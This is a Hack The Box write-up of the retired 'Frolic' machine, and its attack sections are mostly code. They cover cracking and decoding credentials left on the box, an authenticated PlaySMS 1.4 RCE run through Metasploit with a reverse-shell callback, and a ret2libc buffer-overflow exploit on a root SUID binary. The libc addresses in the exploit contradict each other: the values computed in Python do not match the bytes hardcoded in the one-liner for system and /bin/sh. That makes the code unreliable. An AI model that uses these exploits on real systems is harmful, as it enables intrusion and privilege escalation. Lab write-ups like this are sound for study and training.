---
machine: Frolic
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / Linux
state: Retired
tags: [linux, web, ctf, playsms, rce, suid, buffer-overflow, ret2libc]
---

# Frolic — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no flags or real credentials.

## TL;DR

An enumeration-heavy, CTF-flavoured box: 22, 1880 (Node-RED) and 9999 (nginx). Port 9999 holds encoded pages (base64, brainfuck, hex), a password-protected ZIP and a `backup` path pointing at `/playsms`. The credentials `admin:idkwhatispass` open PlaySMS 1.4, vulnerable to authenticated CSV upload → RCE. Root comes from a 32-bit SUID at `/home/ayush/.binary/rop` with a buffer overflow and ret2libc.

## Recon

```bash
nmap -p- --min-rate 1000 -sCV <IP> -oN nmap.txt
```

```text
22/tcp   open  ssh   OpenSSH 7.2p2 Ubuntu
1880/tcp open  http  Node.js (Express middleware)  → Node-RED
9999/tcp open  http  nginx 1.10.3 (Ubuntu)        → "Welcome to nginx!"
```

```bash
gobuster dir -u http://<IP>:9999 -w /usr/share/wordlists/dirb/big.txt -x html,js,txt -r
```

Interesting paths: `/admin/`, a random-looking directory (`/asdiSIAJJ0QWE9JAS`), `/js/`, `/dev/` and `/dev/backup/`.

## Access

1. **`/admin/`**: the login checks credentials in JavaScript (`/js/login.js`); read the check and walk past it. The success page links to the rest.
2. **Base64 file**: the body of `/asdiSIAJJ0QWE9JAS` is base64; decoding yields `impossiblepassword.zip` with a text file inside.
3. **ZIP password**: cracked separately (the `impossiblepassword` text and `zip2john` with a wordlist). The brainfuck page on 9999 decodes to **`idkwhatispass`**, which is the PlaySMS password, not the ZIP one.
4. **`/dev/backup/`**: returns the string `/playsms`. That is the PlaySMS panel, and `admin:idkwhatispass` works there.

```bash
curl -s http://<IP>:9999/dev/backup/
# /playsms
```

Authenticated RCE through CSV import (PlaySMS 1.4):

```bash
msfconsole -q
msf6 > use exploit/multi/http/playsms_uploadcsv_exec
msf6 > set RHOSTS <IP>
msf6 > set RPORT 9999
msf6 > set TARGETURI /playsms
msf6 > set USERNAME admin
msf6 > set PASSWORD idkwhatispass
msf6 > set LHOST tun0
msf6 > run
```

Shell as `www-data`; the user flag lives in `/home/ayush`.

## Escalation

SUID enumeration:

```bash
find / -perm -4000 -type f 2>/dev/null
```

```text
/home/ayush/.binary/rop
```

A 32-bit ELF with root SUID, NX enabled and ASLR disabled on the box:

```bash
file /home/ayush/.binary/rop
checksec --file=/home/ayush/.binary/rop
ldd /home/ayush/.binary/rop
```

The offset to `EIP` is 52. Find it with `gdb`/`pattern_create`, then build the ret2libc from `readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E ' system| exit'` and `strings -a -t x libc.so.6 | grep '/bin/sh'`:

```python
import struct
libc = 0xb7e19000
system = libc + 0x0003a940
exit_  = libc + 0x0002e9d0
binsh  = libc + 0x00158e8b
print("A"*52 + struct.pack("<I", system) + struct.pack("<I", exit_) + struct.pack("<I", binsh))
```

```bash
./rop "$(python2 -c 'print "A"*52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7" + "\x8b\x8e\x95\xb7"')"
# root@frolic
```

Do not copy the addresses from another writeup: the base (`0xb7e19000` here) and the three offsets come from **this** `libc`. If they do not match, the exploit segfaults even though the offset (52) is right.

## Pitfalls

- The port 9999 files mix encodings; decode before spending time on brute force.
- The Metasploit module needs `TARGETURI /playsms` and port 9999, not 1880.
- libc addresses change after a machine reset: recompute with `ldd`.
- With ASLR enabled the direct ret2libc fails; you would need a leak or a full ROP chain.

## Lessons

- A login validated client-side is not a login.
- PlaySMS 1.4 with authenticated CSV upload is straight RCE: keep CMS and plugins patched.
- A SUID binary with a buffer overflow and ASLR off is root; run `checksec` before writing the exploit.
